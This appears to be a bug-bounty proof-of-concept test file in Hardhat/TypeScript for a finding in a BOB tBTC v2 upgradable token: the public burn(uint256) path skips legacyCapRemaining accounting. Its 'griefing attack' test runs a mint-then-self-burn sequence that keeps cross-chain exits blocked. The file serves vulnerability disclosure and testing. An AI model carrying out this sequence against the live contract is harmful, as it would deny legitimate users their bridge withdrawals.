// FINDING-02 Proof of Concept
// burn(uint256) Bypasses legacyCapRemaining Accounting
// Classification: Medium - Griefing
// Reward: $2,000

import { ethers } from "hardhat"
import { expect } from "chai"
import type { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"

describe("FINDING-02: Self-Burn Bypasses legacyCapRemaining Accounting", () => {
  let deployer: SignerWithAddress
  let user: SignerWithAddress
  let admin: SignerWithAddress
  let bridge: SignerWithAddress
  let attacker: SignerWithAddress

  let proxyAsV2: any
  let proxy: any

  const L1_TBTC = "0x3151c5547d1dbcd52076bd3cbe56c79abd55b42f"
  const TOKEN_NAME = "BOB tBTC v2"
  const TOKEN_SYMBOL = "tBTC"
  const DECIMALS = 18

  before(async () => {
    ;[deployer, user, admin, bridge, attacker] = await ethers.getSigners()

    // Deploy V1 implementation
    const OptimismMintableUpgradableERC20Factory =
      await ethers.getContractFactory("OptimismMintableUpgradableERC20", deployer)
    const implementation = await OptimismMintableUpgradableERC20Factory.deploy()
    await implementation.deployed()

    // Deploy TransparentUpgradeableProxy
    const TransparentUpgradeableProxyFactory =
      await ethers.getContractFactory("TransparentUpgradeableProxy", deployer)

    const initializeData = implementation.interface.encodeFunctionData(
      "initialize",
      [bridge.address, L1_TBTC, TOKEN_NAME, TOKEN_SYMBOL, DECIMALS]
    )

    const proxyContract = await TransparentUpgradeableProxyFactory.deploy(
      implementation.address,
      admin.address,
      initializeData
    )
    await proxyContract.deployed()

    proxy = await ethers.getContractAt(
      "ITransparentUpgradeableProxy",
      proxyContract.address
    )

    // Mint initial supply via legacy bridge (simulating pre-upgrade state)
    const proxyAsV1 = await ethers.getContractAt(
      "OptimismMintableUpgradableERC20",
      proxy.address,
      bridge
    )
    await proxyAsV1.mint(user.address, ethers.utils.parseEther("100"))

    // Deploy V2 implementation and upgrade
    const OptimismMintableUpgradableTBTCFactory =
      await ethers.getContractFactory("OptimismMintableUpgradableTBTC", deployer)
    const newImplementation = await OptimismMintableUpgradableTBTCFactory.deploy()
    await newImplementation.deployed()

    await proxy.connect(admin).upgradeTo(newImplementation.address)

    proxyAsV2 = await ethers.getContractAt(
      "OptimismMintableUpgradableTBTC",
      proxy.address,
      deployer
    )

    await proxyAsV2.initializeV2()
  })

  describe("POC: legacyCapRemaining Inflation Attack", () => {
    it("initial state: legacyCapRemaining == totalSupply", async () => {
      const legacyCap = await proxyAsV2.getLegacyCapRemaining()
      const totalSupply = await proxyAsV2.totalSupply()

      console.log("Initial legacyCapRemaining:", ethers.utils.formatEther(legacyCap))
      console.log("Initial totalSupply:", ethers.utils.formatEther(totalSupply))

      expect(legacyCap).to.equal(totalSupply)
    })

    it("burn(uint256) does NOT decrement legacyCapRemaining", async () => {
      const legacyCapBefore = await proxyAsV2.getLegacyCapRemaining()
      const totalSupplyBefore = await proxyAsV2.totalSupply()
      const burnAmount = ethers.utils.parseEther("20")

      // User burns their own tokens using burn(uint256)
      await proxyAsV2.connect(user)["burn(uint256)"](burnAmount)

      const legacyCapAfter = await proxyAsV2.getLegacyCapRemaining()
      const totalSupplyAfter = await proxyAsV2.totalSupply()

      console.log("")
      console.log("After burn(uint256) of 20 tBTC:")
      console.log("  legacyCapRemaining: UNCHANGED at", ethers.utils.formatEther(legacyCapAfter))
      console.log("  totalSupply: DECREASED to", ethers.utils.formatEther(totalSupplyAfter))
      console.log("")

      // legacyCapRemaining should be UNCHANGED (this is the bug)
      expect(legacyCapAfter).to.equal(legacyCapBefore)
      // totalSupply should decrease
      expect(totalSupplyAfter).to.equal(totalSupplyBefore.sub(burnAmount))

      console.log("==================== ACCOUNTING INCONSISTENCY ====================")
      console.log("legacyCapRemaining:", ethers.utils.formatEther(legacyCapAfter))
      console.log("totalSupply:", ethers.utils.formatEther(totalSupplyAfter))
      console.log("DIFFERENCE:", ethers.utils.formatEther(legacyCapAfter.sub(totalSupplyAfter)))
      console.log("")
      console.log("legacyCapRemaining now EXCEEDS totalSupply!")
      console.log("====================================================================")
    })

    it("griefing attack: inflate legacyCapRemaining to extend transition period", async () => {
      console.log("")
      console.log("==================== GRIEFING ATTACK SCENARIO ====================")
      console.log("")
      console.log("Attacker Goal: Extend the transition period indefinitely")
      console.log("Effect: Keep CCIP L2->L1 bridging blocked (FINDING-01)")
      console.log("")

      // Mint tokens to attacker via legacy bridge (increases legacyCapRemaining)
      await proxyAsV2.connect(bridge).mint(attacker.address, ethers.utils.parseEther("50"))

      const legacyCapAfterMint = await proxyAsV2.getLegacyCapRemaining()
      console.log("Step 1: Attacker bridges 50 tBTC via legacy bridge")
      console.log("  legacyCapRemaining increased to:", ethers.utils.formatEther(legacyCapAfterMint))

      // Attacker burns via burn(uint256) - does NOT decrement legacyCapRemaining
      await proxyAsV2.connect(attacker)["burn(uint256)"](ethers.utils.parseEther("50"))

      const legacyCapAfterBurn = await proxyAsV2.getLegacyCapRemaining()
      const totalSupplyAfterBurn = await proxyAsV2.totalSupply()

      console.log("")
      console.log("Step 2: Attacker burns 50 tBTC via burn(uint256)")
      console.log("  legacyCapRemaining: STILL", ethers.utils.formatEther(legacyCapAfterBurn))
      console.log("  totalSupply:", ethers.utils.formatEther(totalSupplyAfterBurn))

      console.log("")
      console.log("ATTACK RESULT:")
      console.log("  - Attacker spent: Gas fees only (tokens returned to L1 via different path)")
      console.log("  - legacyCapRemaining inflated by 50 tBTC")
      console.log("  - Transition period extended")
      console.log("  - CCIP L2->L1 remains blocked for legitimate users")
      console.log("")
      console.log("REPEAT: Attacker can repeat this indefinitely to keep")
      console.log("legacyCapRemaining > 0 forever, permanently blocking CCIP exits")
      console.log("====================================================================")
    })

    it("contrast: bridge burn DOES decrement legacyCapRemaining correctly", async () => {
      // Mint more to user via legacy bridge for this test
      await proxyAsV2.connect(bridge).mint(user.address, ethers.utils.parseEther("30"))

      const legacyCapBefore = await proxyAsV2.getLegacyCapRemaining()
      const burnAmount = ethers.utils.parseEther("10")

      // Bridge burns via burn(address, uint256) - this DOES decrement
      await proxyAsV2.connect(bridge)["burn(address,uint256)"](user.address, burnAmount)

      const legacyCapAfter = await proxyAsV2.getLegacyCapRemaining()

      console.log("")
      console.log("Correct behavior - bridge burn(address, uint256):")
      console.log("  legacyCapRemaining before:", ethers.utils.formatEther(legacyCapBefore))
      console.log("  legacyCapRemaining after:", ethers.utils.formatEther(legacyCapAfter))
      console.log("  Difference:", ethers.utils.formatEther(legacyCapBefore.sub(legacyCapAfter)))

      expect(legacyCapAfter).to.equal(legacyCapBefore.sub(burnAmount))
    })
  })

  describe("Root Cause Analysis", () => {
    it("documents the inconsistent burn paths", async () => {
      console.log("")
      console.log("==================== ROOT CAUSE ====================")
      console.log("")
      console.log("Three burn paths in OptimismMintableUpgradableTBTC:")
      console.log("")
      console.log("1. burn(address _from, uint256 _amount) [onlyBridge]")
      console.log("   - Decrements legacyCapRemaining: YES")
      console.log("   - Restricted to: BRIDGE only")
      console.log("")
      console.log("2. burnFrom(address account, uint256 amount)")
      console.log("   - Decrements legacyCapRemaining: YES (when > 0)")
      console.log("   - Restricted to: BRIDGE only (when legacyCapRemaining > 0)")
      console.log("")
      console.log("3. burn(uint256 amount) [VULNERABLE]")
      console.log("   - Decrements legacyCapRemaining: NO")
      console.log("   - Restricted to: ANYONE can call")
      console.log("")
      console.log("The self-burn path was not updated to interact with")
      console.log("legacyCapRemaining, creating an accounting bypass.")
      console.log("====================================================")
    })
  })
})
